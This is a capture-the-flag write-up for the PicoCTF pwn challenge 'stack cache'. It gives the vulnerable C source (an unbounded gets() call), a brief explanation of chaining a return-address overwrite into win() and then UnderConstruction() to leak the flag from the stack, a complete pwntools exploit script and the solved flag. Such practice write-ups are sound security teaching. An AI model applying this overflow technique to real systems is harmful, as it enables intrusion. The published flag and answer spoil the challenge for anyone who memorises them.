---
title: PicoCTF - stack cache
tags: [PicoCTF, CTF, PWN]

category: "Security > Practice > PicoCTF > PWN"
---

# PicoCTF - stack cache
## Background
BoF
## Source code
:::spoiler
```cpp!
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 16
#define FLAGSIZE 64
#define INPSIZE 10

/*
This program is compiled statically with clang-12
without any optimisations.
*/

void win() {
  char buf[FLAGSIZE];
  char filler[BUFSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
}

void UnderConstruction() {
        // this function is under construction
        char consideration[BUFSIZE];
        char *demographic, *location, *identification, *session, *votes, *dependents;
	char *p,*q, *r;
	// *p = "Enter names";
	// *q = "Name 1";
	// *r = "Name 2";
        unsigned long *age;
	printf("User information : %p %p %p %p %p %p\n",demographic, location, identification, session, votes, dependents);
	printf("Names of user: %p %p %p\n", p,q,r);
        printf("Age of user: %p\n",age);
        fflush(stdout);
}

void vuln(){
   char buf[INPSIZE];
   printf("Give me a string that gets you the flag\n");
   gets(buf);
   printf("%s\n",buf);
   return;
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  printf("Bye!");
  return 0;
}

```
:::
## Recon
這一題也蠻簡單的，不過也是比較少人解，可以看到他有讀取flag的win function和print出stack value的UnderConstruction function，重點是win function只有讀取flag沒有print出來，所以直接跳rip到win function後再跳到UnderConstruction function就可以print出flag的資訊
## Exploit
```python!
from pwn import *

# r = process("./vuln")
r = remote('saturn.picoctf.net', 60896)

r.recvline()
# raw_input()
win_addr = 0x8049d90
UnderConstruction_addr = 0x8049e10
r.sendline(b'a' * 14 + p32(win_addr) + p32(UnderConstruction_addr) )
r.recvuntil(b': ')
flag = r.recvline().strip().decode()
r.recvuntil(b":")
flag += (" " + r.recvline().strip().decode())
r.recvuntil(b":")
flag += (" " + r.recvline().strip().decode())
success(flag)
flag = flag.split(' ')
FLAG = ""
for i in range(len(flag)):
    FLAG += flag[i][2:]

success("Flag = {}".format(bytes.fromhex(FLAG).decode('cp437')[::-1]))

r.interactive()
```

Flag: `picoCTF{Cle4N_uP_M3m0rY_b4f3c84e}`